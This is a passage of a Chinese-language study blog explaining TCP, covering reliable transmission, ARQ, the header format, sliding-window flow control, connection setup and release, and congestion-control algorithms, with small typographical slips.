连接是一条<strong>虚连接</strong>而不是一条真正的物理连接。</p><p>TCP 对应用进程一次把多长的报文发送到 TCP 的缓存中是不关心的。</p><p>TCP 根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节（UDP 发送的报文长度是应用进程给出的）。</p><p>TCP 可把太长的数据块划分短一些再传送。TCP 也可等待积累有足够多的字节后再构成报文段发送出去， 即缓存发送。</p><h3 id="tcp的连接"><a class="markdownIt-Anchor" href="#tcp的连接"></a> TCP的连接</h3><p>在每一个TCP连接中都有两个端点（因为TCP只能实现单一的端对端通信），TCP连接的端点叫做套接字/socket或插口。</p><p>套接字 socket = （IP地址:端口号），例如（192.169.1.20:2028）。每一条TCP连接唯一的被一对套接字所确定，即TCP 连接 ::={socket1，socket2} = {(IP1:port1),(IP2::port2)}</p><h4 id="tcp-ip-sokcet的关系"><a class="markdownIt-Anchor" href="#tcp-ip-sokcet的关系"></a> TCP IP Sokcet的关系</h4><p>TCP 连接就是由协议软件所提供的一种抽象。TCP 连接的端点是个很抽象的套接字，即（IP 地址：端口号）。同一个 IP 地址可以有多个不同的 TCP 连接。同一个端口号也可以出现在多个不同的 TCP 连接中。</p><h4 id="关于socket"><a class="markdownIt-Anchor" href="#关于socket"></a> 关于Socket</h4><p>应用编程接口  API  称为 socket API, 简称为 socket。socket API 中使用的一个函数名也叫作 socket。调用 socket 函数的端点称为 socket。调用 socket 函数时其返回值称为 socket 描述符，可简称为 socket。在操作系统内核中连网协议的 Berkeley 实现，称为 socket 实现。</p><h3 id="可靠传输的工作原理"><a class="markdownIt-Anchor" href="#可靠传输的工作原理"></a> 可靠传输的工作原理</h3><p>理想的传输条件有以下两个特点：</p><ol><li>传输信道不产生差错。</li><li>不管发送方以多快的速度发送数据，接收方总是来得及处理收到的数据。</li></ol><p>在这样的理想传输条件下，不需要采取任何措施就能够实现可靠传输。然而实际的网络都不具备以上两个理想条件，因为网络本身是不可靠的。必须使用一些可靠传输协议，在不可靠的传输信道实现可靠传输。</p><h4 id="停止等待协议"><a class="markdownIt-Anchor" href="#停止等待协议"></a> 停止等待协议</h4><p>“停止等待”就是每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组，类似于与别人聊天每说一句话就询问对方听见没有，是一个很天真的协议。</p><p>全双工通信的双方既是发送方也是接收方。为了讨论问题的方便，我们仅考虑 A 发送数据，而 B 接收数据并发送确认。因此 A 叫做发送方，而 B 叫做接收方。</p><h5 id="无差错情况"><a class="markdownIt-Anchor" href="#无差错情况"></a> 无差错情况</h5><p>A 发送分组 M1，发完就暂停发送，等待 B 的确认 (ACK)。B 收到了 M1 向 A 发送  ACK。A 在收到了对 M1 的确认后，就再发送下一个分组  M2。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231110084535335.png" alt="image-20231110084535335" /></p><h5 id="出现差错"><a class="markdownIt-Anchor" href="#出现差错"></a> 出现差错</h5><p>在接收方 B 会出现两种情况：</p><ol><li>B 接收 M1 时检测出了差错，就丢弃 M1，其他什么也不做（不通知 A 收到有差错的分组）。</li><li>M1 在传输过程中丢失了，这时 B 当然什么都不知道，也什么都不做。</li></ol><p>在这两种情况下，B 都不会发送任何信息。但A都必须重发分组，直到B正确接收为止，这样才能实现可靠通信。</p><h6 id="问题一"><a class="markdownIt-Anchor" href="#问题一"></a> 问题一</h6><p>但是在B什么都不做的情况下，A要如何知道需要重传M1呢？停止等待协议给出的办法是超时重传。</p><p>超时重传让A为每一组发送的分组设置了一个超时计时器。如果在该计时器过期之前收到了确认ACK，就撤销这个计时器，继续发送下一个分组；否则认为该分组发送错误或者丢失，就重发该分组。</p><h6 id="问题二"><a class="markdownIt-Anchor" href="#问题二"></a> 问题二</h6><p>若分组正确到达B，但B回送的确认丢失或延迟了，A未收到B的确认，会超时重发。B 可能会收到重复的 M1 。B如何知道收到了重复的分组，需要丢弃呢？协议给出了编号的方法。</p><p>A为每一个发送的分组都进行编号。若B收到了编号相同的分组，则认为收到了重复分组，丢弃重复的分组，并回送确认。</p><p>B为发送的确认也进行编号，指示该确认是对哪一个分组的确认。</p><p>A根据确认及其编号，可以确定它是对哪一个分组的确认，避免重发发送。若为重复的确认，则将其丢弃。</p><h6 id="问题三"><a class="markdownIt-Anchor" href="#问题三"></a> 问题三</h6><p>若 B 所发送的对 M1 的确认丢失了，那么 A 在设定的超时重传时间内不能收到确认，但 A 并无法知道：是自己发送的分组出错、丢失了，或者 是 B 发送的确认丢失了。因此 A 在超时计时器到期后就要重传 M1，以此来确认丢失或者确认迟到。</p><p>如果B收到了重复的分组，那么它将采取两种行动：</p><ol><li>第一，丢弃这个重复的分组 M1，不向上层交付。</li><li>第二，向 A 发送确认。不能认为已经发送过确认就不再发送，因为 A 之所以重传 M1 就表示 A 没有收到对 M1 的确认。</li></ol><p>假如传输过程中没有出现差错，但 B 对分组 M1 的确认迟到了。</p><p>那么A 会收到重复的确认。对重复的确认的处理很简单：收下后就丢弃。B 仍然会收到重复的 M1，并且同样要丢弃重复的 M1，并重传确认分组。</p><p>注意</p><ul><li>在发送完一个分组后，必须暂时保留已发送的分组的副本，以备重发。分组和确认分组都必须进行编号。</li><li>超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些。 因为如果设置的太短，数据还在发回来之前就被确认为丢失或者失败，A就会不断发送数据陷入死循环。</li></ul><h5 id="归纳"><a class="markdownIt-Anchor" href="#归纳"></a> 归纳</h5><ol><li>停止等待。发送方每次只发送一个分组。在收到确认后再发送下一个分组。</li><li>编号。对发送的每个分组和确认都进行编号。</li><li>自动重传请求。发送方为每个发送的分组设置一个超时计时器。若超时计时器超时，发送方会自动重传分组。</li><li>简单，但信道利用率太低。</li></ol><h4 id="信道利用率"><a class="markdownIt-Anchor" href="#信道利用率"></a> 信道利用率</h4><p>停止等待协议的优点是简单，但是缺点是信道利用率太低。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231110091642949.png" alt="image-20231110091642949" /></p><p>为了提高传输效率，发送方可以不使用低效率的停止等待协议，而是采用<strong>流水线传输</strong>。流水线传输就是发送方可连续发送多个分组，不必每发完一个分组就停顿下来等待对方的确认。这样可使信道上一直有数据不间断地传送。由于信道上一直有数据不间断地传送，这种传输方式可获得很高的信道利用率。</p><h4 id="自动重传请求arq"><a class="markdownIt-Anchor" href="#自动重传请求arq"></a> 自动重传请求ARQ</h4><p>通常A总是可以收到确认，如果A总是不断的重传数据，说明通信线路太差。</p><p>通过使用如上重传机制，我们可以在不可靠的网络上实现可靠的通信。我们把这种可靠传输协议称为自动重传请求/Automatic Repeate reQuest。意思是重传请求时自动进行的，接收方不需要做出任何请求让对方重传某个出错的分组。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231110092941558.png" alt="image-20231110092941558" /></p><p>基本思想如下：</p><p>发送方一次可以发出多个分组。使用滑动窗口协议控制发送方和接收方所能发送和接收的分组的数量和编号。每收到一个确认，发送方就把发送窗口向前滑动。接收方一般采用累积确认的方式。采用回退N（Go-Back-N）方法进行重传。</p><p>滑动窗口的概念如下：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231110094113052.png" alt="image-20231110094113052" /></p><h5 id="累积确认"><a class="markdownIt-Anchor" href="#累积确认"></a> 累积确认</h5><p>接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认。这样就表示：到这个分组为止的所有分组都已正确收到了。</p><ul><li>优点：容易实现，即使确认丢失也不必重传。</li><li>缺点：不能向发送方反映出接收方已经正确收到的所有分组的信息。</li></ul><h5 id="go-back-n回退-n"><a class="markdownIt-Anchor" href="#go-back-n回退-n"></a> Go-back-N（回退 N）</h5><p>如果发送方发送了前 5 个分组，而中间的第 3 个分组丢失了。这时接收方只能对前两个分组发出确认。发送方无法知道后面三个分组的下落，而只好把后面的三个分组都再重传一次。这就叫做 Go-back-N（回退 N），表示需要再退回来重传已发送过的 N 个分组。</p><p>可见当通信线路质量不好时，连续 ARQ 协议会带来负面的影响。</p><h3 id="tcp报文段的首部格式"><a class="markdownIt-Anchor" href="#tcp报文段的首部格式"></a> TCP报文段的首部格式</h3><p>TCP 报文段首部的前 20 个字节是固定的，后面有 4n 字节是根据需要而增加的选项 (n 是整数)。因此 TCP 首部的最小长度是 20 字节。</p><p>具体格式图解如下</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231117083644231.png" alt="image-20231117083644231" /></p><h4 id="源端口和目的端口字段"><a class="markdownIt-Anchor" href="#源端口和目的端口字段"></a> 源端口和目的端口字段</h4><p>各占 2 字节。端口是运输层与应用层的服务接口。运输层的复用和分用功能都要通过端口才能实现。</p><h4 id="序号字段"><a class="markdownIt-Anchor" href="#序号字段"></a> 序号字段</h4><p>占 4 字节。TCP 连接中传送的数据流中的每一个字节都编上一个序号。序号字段的值则指的是本报文段所发送的数据的第一个字节的序号。</p><p>比如有：</p><p>报文段 1 序号 = 1001 （数据字节序号：1001 ~ 2000）</p><p>报文段 2 序号 = 2001 （数据字节序号：2001 ~ 3000）</p><p>……</p><h4 id="确认号字段"><a class="markdownIt-Anchor" href="#确认号字段"></a> 确认号字段</h4><p>占 4 字节，是期望收到对方的下一个报文段的数据的第一个字节的序号。</p><h4 id="数据偏移"><a class="markdownIt-Anchor" href="#数据偏移"></a> 数据偏移</h4><p>即首部长度，占 4 位，它指出 TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远。“数据偏移”的单位是 32 位字（以 4 字节为计算单位）。</p><h4 id="保留字段"><a class="markdownIt-Anchor" href="#保留字段"></a> 保留字段</h4><p>占 6 位，保留为今后使用，但目前应置为 0。</p><h4 id="保留字段-2"><a class="markdownIt-Anchor" href="#保留字段-2"></a> 保留字段</h4><p>占 6 位，保留为今后使用，但目前应置为 0。</p><h4 id="确认-ack"><a class="markdownIt-Anchor" href="#确认-ack"></a> 确认 ACK</h4><p>只有当 ACK =1 时确认号字段才有效。当 ACK =0 时，确认号无效。</p><h4 id="推送-psh-push"><a class="markdownIt-Anchor" href="#推送-psh-push"></a> 推送 PSH (PuSH)</h4><p>接收 TCP 收到 PSH = 1 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。</p><h4 id="复位-rst-reset"><a class="markdownIt-Anchor" href="#复位-rst-reset"></a> 复位 RST (ReSeT)</h4><p>当 RST=1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。</p><h4 id="同步-syn"><a class="markdownIt-Anchor" href="#同步-syn"></a> 同步 SYN</h4><p>同步 SYN = 1 表示这是一个连接请求或连接接受报文。</p><h4 id="终止-fin-finish"><a class="markdownIt-Anchor" href="#终止-fin-finish"></a> 终止 FIN (FINish)</h4><p>用来释放一个连接。FIN=1 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。</p><h4 id="窗口字段"><a class="markdownIt-Anchor" href="#窗口字段"></a> 窗口字段</h4><p>占 2 字节，用来让对方设置发送窗口的依据，单位为字节。</p><h4 id="检验和"><a class="markdownIt-Anchor" href="#检验和"></a> 检验和</h4><p>占 2 字节。检验和字段检验的范围包括首部和数据这两部分。在计算检验和时，要在 TCP 报文段的前面加上 12 字节的伪首部。</p><h4 id="紧急指针字段"><a class="markdownIt-Anchor" href="#紧急指针字段"></a> 紧急指针字段</h4><p>占 16 位，指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面）。</p><h4 id="选项字段"><a class="markdownIt-Anchor" href="#选项字段"></a> 选项字段</h4><p>长度可变。TCP 最初只规定了一种选项，即最大报文段长度 MSS。MSS 告诉对方 TCP：“我的缓存所能接收的报文段的数据字段的最大长度是 MSS 个字节。”</p><h5 id="mss-maximum-segment-size"><a class="markdownIt-Anchor" href="#mss-maximum-segment-size"></a> MSS (Maximum Segment Size)</h5><p>一个选项字段，是 TCP 报文段中的数据字段的最大长度。数据字段加上 TCP 首部才等于整个的 TCP 报文段。所以，MSS是“TCP 报文段长度减去 TCP 首部长度”。</p><h4 id="填充字段"><a class="markdownIt-Anchor" href="#填充字段"></a> 填充字段</h4><p>这是为了使整个首部长度是 4 字节的整数倍。</p><h3 id="tcp-可靠传输的实现"><a class="markdownIt-Anchor" href="#tcp-可靠传输的实现"></a> TCP 可靠传输的实现</h3><h4 id="以字节为单位的滑动窗口"><a class="markdownIt-Anchor" href="#以字节为单位的滑动窗口"></a> 以字节为单位的滑动窗口</h4><p>因为自动重传的效率太低，所以TCP采用滑动窗口的方式来传输数据，使用流水线传输和滑动窗口协议实现高效、可靠的传输。</p><p>注意，TCP的滑动窗口是<strong>以字节为单位</strong>，而非报文段。</p><p>发送方 A 和接收方 B 分别维持一个发送窗口和一个接收窗口。发送窗口表示：在没有收到确认的情况下，可以连续把窗口内的数据全部发送出去。接收窗口表示：只允许接收落入窗口内的数据。</p><p>根据 B 给出的窗口值，A 构造出自己的发送窗口。发送窗口表示：在没有收到 B 的确认的情况下，A 可以连续把窗口内的数据都发送出去。 发送窗口里面的序号表示允许发送的序号。窗口越大，发送方就可以在收到对方确认之前连续发送更多的数据，因而可能获得更高的传输效率。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231117090234811.png" alt="image-20231117090234811" /></p><p>其中，允许发送的部分又可以分为两种：已发送但未收到确认和允许发送但未发送。当所有允许发送窗口内的字节都已经发送且收到确认，发送窗口就可以前移滑动发送下一段字节流。</p><p>对于接收窗口，则负责接收允许接收的部分并给出确认信号。如果未按序收到字节，就先存下已收到的信息等待缺少数据的到达，或者直接丢弃未按序的数据等待重新发送，这一点TCP没有给出明确规定。</p><p>如果发送窗口内的序号都已用完，但是还是没有收到确认，就必须停止发送。</p><h4 id="发送缓存"><a class="markdownIt-Anchor" href="#发送缓存"></a> 发送缓存</h4><p>发送方的应用进程把字节流写入TCP的发送缓存，接收方的应用进程从TCP的接受缓存中读取字节流。</p><p>发送缓存用来暂时存放：发送应用程序传送给发送方 TCP 准备发送的数据；TCP 已发送出但尚未收到确认的数据。接收缓存用来暂时存放：按序到达的、但尚未被接收应用程序读取的数据；不按序到达的数据。</p><p>这里要强调三点：</p><ol><li>A 的发送窗口并不总是和 B 的接收窗口一样大（因为有一定的时间滞后）。</li><li>TCP 标准没有规定对不按序到达的数据应如何处理。通常是先临时存放在接收窗口中，等到字节流中所缺少的字节收到后，再按序交付上层的应用进程。</li><li>TCP 要求接收方必须有累积确认的功能，这样可以减小传输开销。</li></ol><h4 id="发送确认"><a class="markdownIt-Anchor" href="#发送确认"></a> 发送确认</h4><p>接收方可以在合适的时候发送确认，也可以在自己有数据要发送时把确认信息顺便捎带上。但请注意两点：</p><ol><li>接收方不应过分推迟发送确认，否则会导致发送方不必要的重传，这反而浪费了网络的资源。</li><li>捎带确认实际上并不经常发生，因为大多数应用程序很少同时在两个方向上发送数据。</li></ol><h3 id="tcp-的运输连接管理"><a class="markdownIt-Anchor" href="#tcp-的运输连接管理"></a> TCP 的运输连接管理</h3><h4 id="tcp-的连接建立"><a class="markdownIt-Anchor" href="#tcp-的连接建立"></a> TCP 的连接建立</h4><p>TCP的连接有三个阶段：</p><ol><li>连接建立</li><li>数据传送</li><li>连接释放</li></ol><p>TCP 连接的管理就是使 TCP 连接的建立和释放都能正常地进行。</p><h5 id="连接建立"><a class="markdownIt-Anchor" href="#连接建立"></a> 连接建立</h5><p>TCP的连接建立也要解决三个问题：</p><ol><li>使每一方能够确认对方的存在</li><li>允许双方协商一些参数，比如最大窗口值、是否使用窗口扩大选项和时间戳选项以及服务质量等</li><li>能够对运输的实体资源进行分配</li></ol><p>TCP 连接的建立采用客户服务器方式。主动发起连接建立的应用进程叫做客户 (client)。被动等待连接建立的应用进程叫做服务器 (server)。</p><p>TCP 建立连接的过程叫做握手。握手需要在客户和服务器之间交换三个 TCP 报文段。称之为<strong>三报文</strong>握手。采用三报文握手主要是为了防止已失效的连接请求报文段突然又传送到了，因而产生错误。</p><p>以下是建立TCP连接的图示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231117104110054.png" alt="image-20231117104110054" /></p><h4 id="tcp-的连接释放"><a class="markdownIt-Anchor" href="#tcp-的连接释放"></a> TCP 的连接释放</h4><p>TCP 连接释放过程比较复杂。数据传输结束后，通信的双方都可释放连接。TCP 连接释放过程是<strong>四报文</strong>握手/挥手。</p><p>数据传输结束后，通信的双方都可释放连接。现在 A 的应用进程先向其 TCP 发出连接释放报文段，并停止再发送数据，主动关闭 TCP 连接。A 把连接释放报文段首部的FIN = 1，其序号seq = u，等待 B 的确认。</p><p>B 发出确认，确认号 ack = u+1，而这个报文段自己的序号 seq = v。TCP 服务器进程通知高层应用进程。从 A 到 B 这个方向的连接就释放了，TCP 连接处于半关闭状态。B 若发送数据，A 仍要接收。</p><p>若 B 已经没有要向 A 发送的数据，其应用进程就通知 TCP 释放连接。</p><p>A 收到连接释放报文段后，必须发出确认。  在确认报文段中ACK = 1，确认号 ack = w + 1，自己的序号 seq = u + 1</p><p>下图为释放TCP连接的的图示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231117104837227.png" alt="image-20231117104837227" /></p><p>TCP还有一个保活计时器的概念用来防止TCP连接出现长时间空闲。</p><p>保活计时器 通常设置为2小时 。若服务器过了2小时还没有收到客户的信息，它就发送探测报文段。若发送了10个探测报文段（每一个相隔75秒）还没有响应，就假定客户出了故障，因而就终止该连接。</p><h4 id="tcp-的有限状态机"><a class="markdownIt-Anchor" href="#tcp-的有限状态机"></a> TCP 的有限状态机</h4><p>箭头旁边的字，表明引起这种变迁的原因，或表明发生状态变迁后又出现什么动作。</p><p>图中有三种不同的箭头。</p><ol><li>粗实线箭头表示对客户进程的正常变迁。</li><li>粗虚线箭头表示对服务器进程的正常变迁。</li><li>细线箭头表示异常变迁。</li></ol><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231117110348138.png" alt="image-20231117110348138" /></p><p>（不要求掌握）</p><h3 id="tcp的流量控制"><a class="markdownIt-Anchor" href="#tcp的流量控制"></a> TCP的流量控制</h3><h4 id="利用滑动窗口实现流量控制"><a class="markdownIt-Anchor" href="#利用滑动窗口实现流量控制"></a> 利用滑动窗口实现流量控制</h4><p>一般说来，我们总是希望数据传输得更快一些。但如果发送方把数据发送得过快，接收方就可能来不及接收，这就会造成数据的丢失。<strong>流量控制 (flow control)</strong> 就是让发送方的发送速率不要太快，既要让接收方来得及接收，也不要使网络发生拥塞。</p><p>利用<strong>滑动窗口机制</strong>可以很方便地在 TCP 连接上实现流量控制。其实就是由接受方将自己还剩余多少缓存发送给发送方，告诉发送方下一次该发送多少窗口。</p><p>一般来说，用rewd属性来表示剩余接收窗口的大小。比如接受方返回给发送方的数据中包含rewd=400（字节），告诉发送方还能再发送400个字节大小的数据。当rewd属性为0时，将不允许发送方再继续发送数据。当接受方处理完数据时，将再次发送一次请求重置rewd的值并允许发送方继续发送数据。</p><h5 id="死锁"><a class="markdownIt-Anchor" href="#死锁"></a> 死锁</h5><p>如果接受方向发送方发送了零报文窗口后不久，接收缓存又有了一些储存空间，再次向发送方发送ewnd=400的报文段，但是这个报文段在传送过程中丢失了。那么发送方将一直等待接受方的非零窗口通知，而接受方也会一直等待发送方的数据，此时将出现<strong>互相等待的死锁</strong>。</p><p>为了解决这个问题，TCP为每一个连接设置了一个<strong>持续计时器(persistence timer)</strong>。</p><h5 id="持续计时器"><a class="markdownIt-Anchor" href="#持续计时器"></a> 持续计时器</h5><p>为了解决这个问题， TCP 为每一个连接设有一个<strong>持续计时器  (persistence timer)</strong> 。</p><p>只要 TCP 连接的一方收到对方的零窗口通知，就启动该持续计时器。若持续计时器设置的时间到期，就发送一个<strong>零窗口探测报文段</strong>（仅携带 1 字节的数据），而对方就在确认这个探测报文段时给出了现在的窗口值。</p><ul><li>若窗口仍然是零，则收到这个报文段的一方就重新设置持续计时器。</li><li>若窗口不是零，则死锁的僵局就可以打破了。</li></ul><h4 id="tcp-的传输效率"><a class="markdownIt-Anchor" href="#tcp-的传输效率"></a> TCP 的传输效率</h4><p>可以用不同的机制来控制 TCP 报文段的发送时机:</p><ul><li>第一种机制是 TCP 维持一个变量，它等于最大报文段长度 MSS。只要缓存中存放的数据达到 MSS 字节时，就组装成一个 TCP 报文段发送出去。</li><li>第二种机制是由发送方的应用进程指明要求发送报文段，即 TCP 支持的推送 (push) 操作。</li><li>第三种机制是发送方的一个计时器期限到了，这时就把当前已有的缓存数据装入报文段（但长度不能超过 MSS）发送出去。</li></ul><p>如何控制 TCP 发送报文段的时机仍然是一个较为复杂的问题。</p><h3 id="tcp-的拥塞控制"><a class="markdownIt-Anchor" href="#tcp-的拥塞控制"></a> TCP 的拥塞控制</h3><h4 id="拥塞控制的一般原理"><a class="markdownIt-Anchor" href="#拥塞控制的一般原理"></a> 拥塞控制的一般原理</h4><p>在某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种现象称为<strong>拥塞 (congestion)</strong>。最坏结果将导致<strong>系统崩溃</strong>。</p><p>比如双十一，漫展抢票的时候付尾款阶段很难支付成功，因为有太多的人都想要购买，向服务器提交的付款请求超出了服务器信息处理的吞吐量，延迟越来越高，最后系统崩溃。</p><h5 id="原因"><a class="markdownIt-Anchor" href="#原因"></a> 原因</h5><p>网络拥塞往往是由许多因素引起的。例如：</p><ul><li>点缓存的容量太小；</li><li>链路的容量不足；</li><li>处理机处理的速率太慢；</li><li>拥塞本身会进一步加剧拥塞；</li></ul><p>最根本的原因是 ∑对资源需求 &gt; 可用资源。</p><h5 id="拥塞控制与流量控制的区别"><a class="markdownIt-Anchor" href="#拥塞控制与流量控制的区别"></a> 拥塞控制与流量控制的区别</h5><h6 id="流量控制"><a class="markdownIt-Anchor" href="#流量控制"></a> 流量控制</h6><p>抑制发送端发送数据的速率，以使接收端来得及接收；是点对点通信量的控制，是<strong>端到端</strong>的问题；</p><h6 id="拥塞控制"><a class="markdownIt-Anchor" href="#拥塞控制"></a> 拥塞控制</h6><p>防止过多的数据注入到网络中，使网络中的路由器或链路不致过载；是一个<strong>全局性</strong>的过程，涉及到与降低网络传输性能有关的所有因素。</p><p>拥塞控制的作用如下图。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231201091733089.png" alt="image-20231201091733089" /></p><h5 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h5><ul><li>拥塞控制的前提：网络能够承受现有的网络负荷。</li><li>实践证明，拥塞控制是很难设计的，因为它是一个动态问题。</li><li>分组的丢失是网络发生拥塞的<strong>征兆</strong>而不是<strong>原因</strong>。正式因为堵塞才会导致丢包现象。</li><li>在许多情况下，甚至正是<strong>拥塞控制本身</strong>成为引起网络性能恶化、甚至发生死锁的原因。</li></ul><h5 id="解决拥塞的思路"><a class="markdownIt-Anchor" href="#解决拥塞的思路"></a> 解决拥塞的思路</h5><ul><li>增加网络可用资源。但是无法从根源上解决问题，往往只是将瓶颈转移到其他环节。</li><li>减少用户对资源的需求。</li></ul><h4 id="tcp-的拥塞控制方法"><a class="markdownIt-Anchor" href="#tcp-的拥塞控制方法"></a> TCP 的拥塞控制方法</h4><ul><li><p>TCP 采用<strong>基于窗口的方法</strong>进行拥塞控制。该方法属于闭环控制方法。</p></li><li><p>TCP发送方维持一个<strong>拥塞窗口 cwnd (Congestion Window)</strong>。其中拥塞窗口的作用域为整个网络，发送端根据当前网络的情况来设置cwnd；而流量控制窗口rwnd的作用域则仅限于一条TCP通信。</p></li><li><p>发送端利用拥塞窗口根据网络的拥塞情况调整发送的数据量。</p></li><li><p>发送窗口大小不仅取决于接收方窗口，还取决于网络的拥塞状况，所以真正的发送窗口值为：</p><p><strong>真正的发送窗口值 = Min (接收方窗口值，拥塞窗口值) = Min (cwnd, rwnd)</strong></p></li></ul><h5 id="控制拥塞窗口的原则"><a class="markdownIt-Anchor" href="#控制拥塞窗口的原则"></a> 控制拥塞窗口的原则</h5><p>只要网络没有出现拥塞，拥塞窗口就可以再增大一些，以便把更多的分组发送出去，这样就可以提高网络的利用率。但只要网络出现拥塞或有可能出现拥塞，就必须把拥塞窗口减小一些，以减少注入到网络中的分组数，以便缓解网络出现的拥塞。</p><h5 id="拥塞发生的判断"><a class="markdownIt-Anchor" href="#拥塞发生的判断"></a> 拥塞发生的判断</h5><p>当 重传定时器 超时，说明网络<strong>已经</strong>发生了拥塞。</p><p>当 收到三个重复的ACK，<strong>预示</strong>网络可能会出现拥塞但还未发生拥塞。</p><p>至于为什么是三次ACK，可以参考这篇文章：<a href="https://www.zhihu.com/question/280521822/answer/423570673">(3 封私信 / 2 条消息) 为什么收到三个重复的ACK意味着发生拥塞? - 知乎 (zhihu.com)</a>。</p><h5 id="拥塞控制算法"><a class="markdownIt-Anchor" href="#拥塞控制算法"></a> 拥塞控制算法</h5><p>一共有四种控制算法（ RFC 5681）。</p><ul><li>慢开始 (slow-start)</li><li>拥塞避免 (congestion avoidance)</li><li>快重传 (fast retransmit)</li><li>快恢复 (fast recovery)</li></ul><h6 id="慢开始"><a class="markdownIt-Anchor" href="#慢开始"></a> 慢开始</h6><p>慢开始的目的是用来确定网络的负载能力或拥塞程度，思路是由小到大逐渐增大拥塞窗口的数值。</p><p>它还有两个变量：<strong>拥塞窗口</strong>和<strong>慢开始门限</strong>。</p><p>慢开始在每收到一个对新的报文段的确认后，可以把拥塞窗口增加最多一个 SMSS 的数值，以此来控制cwnd拥塞窗口。也就是拥塞窗口 cwnd 每次的增加量 = min (N, SMSS)。其中 N 是原先未被确认的、但现在被刚收到的确认报文段所确认的字节数。</p><p>不难看出，当 N &lt; SMSS 时，拥塞窗口每次的增加量要小于 SMSS。用这样的方法逐步增大发送方的拥塞窗口 cwnd，可以使分组注入到网络的速率更加合理。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231201095803574.png" alt="image-20231201095803574" /></p><p>使用慢开始算法后，每经过一个<strong>传输轮次 (transmission round)</strong>，拥塞窗口 cwnd 就加倍。 一个传输轮次所经历的时间其实就是往返时间 RTT。</p><p>“传输轮次”更加强调：把拥塞窗口 cwnd 所允许发送的报文段都连续发送出去，并收到了对已发送的最后一个字节的确认。例如，拥塞窗口 cwnd = 4，这时的往返时间 RTT 就是发送方连续发送 4 个报文段，并收到这 4 个报文段的确认，总共经历的时间。</p><p>关于慢开始门限状态变量ssthresh，用法如下：</p><ol><li>当 cwnd &lt; ssthresh 时，使用慢开始算法。</li><li>当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用<strong>拥塞避免算法</strong>。</li><li>当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用<strong>拥塞避免算法</strong>。</li></ol><h6 id="拥塞避免"><a class="markdownIt-Anchor" href="#拥塞避免"></a> 拥塞避免</h6><p>拥塞避免算法即让拥塞窗口 cwnd 缓慢地增大，避免出现拥塞。每经过一个传输轮次，拥塞窗口 cwnd = cwnd + 1。使拥塞窗口 cwnd 按线性规律缓慢增长。在拥塞避免阶段，具有 “加法增大” (Additive Increase) 的特点。</p><p>无论在慢开始阶段还是在拥塞避免阶段，一旦发送方判断网络出现拥塞（重传定时器超时），就执行以下步骤：</p><ol><li>ssthresh = max (cwnd/2，2)</li><li>cwnd = 1</li><li>执行慢开始算法</li></ol><p>这样可以迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231201100745473.png" alt="image-20231201100745473" /></p><p>“拥塞避免”并非指完全能够避免了拥塞。利用以上的措施要完全避免网络拥塞还是不可能的。“拥塞避免”是说在拥塞避免阶段把拥塞窗口控制为按线性规律增长，<strong>使网络比较不容易出现拥塞</strong>。</p><p>回到上图，当拥塞窗口 cwnd = 16 时（图中的点），出现了一个新的情况，就是发送方一连收到 3 个对同一个报文段的重复确认（图中记为 3-ACK）。发送方改为执行<strong>快重传</strong>和<strong>快恢复算法</strong>。（划考点）</p><h6 id="快重传算法"><a class="markdownIt-Anchor" href="#快重传算法"></a> 快重传算法</h6><p><strong>发送方只要一连收到三个重复确认</strong>，就知道接收方确实没有收到报文段，因而应当<strong>立即进行重传（即“快重传”）</strong>，这样就不会出现超时，发送方也不就会误认为出现了网络拥塞。使用快重传可以使整个网络的吞吐量提高约20%。不难看出，快重传并非取消重传计时器，而是在某些情况下可以更早地（更快地）重传丢失的报文段。</p><p>采用<strong>快重传 FR (Fast Retransmission) 算法</strong>可以让发送方<strong>尽早知道发生了个别报文段的丢失</strong>。快重传 算法首先要求接收方不要等待自己发送数据时才进行捎带确认，而是要立即发送确认，即使收到了失序的报文段也要立即发出对已收到的报文段的重复确认。</p><h6 id="快恢复算法"><a class="markdownIt-Anchor" href="#快恢复算法"></a> 快恢复算法</h6><p>当发送端收到连续三个重复的确认时，由于发送方现在认为网络很可能没有发生拥塞，因此现在不执行慢开始算法，而是执行快恢复算法 FR (Fast Recovery) 算法：</p><ol><li>慢开始门限 ssthresh = 当前拥塞窗口 cwnd / 2 ；</li><li>新拥塞窗口 cwnd = 慢开始门限 ssthresh ；</li><li>开始执行拥塞避免算法，使拥塞窗口缓慢地线性增大。</li></ol><p>可以看出，在拥塞避免阶段，拥塞窗口是按照线性规律增大的。这常称为“<strong>加法增大</strong>” AI (Additive Increase)。当出现超时或3个重复的确认时，就要把门限值设置为当前拥塞窗口值的一半，并大大减小拥塞窗口的数值。这常称为“<strong>乘法减小</strong>”MD (Multiplicative Decrease)。二者合在一起就是所谓的 <strong>AIMD 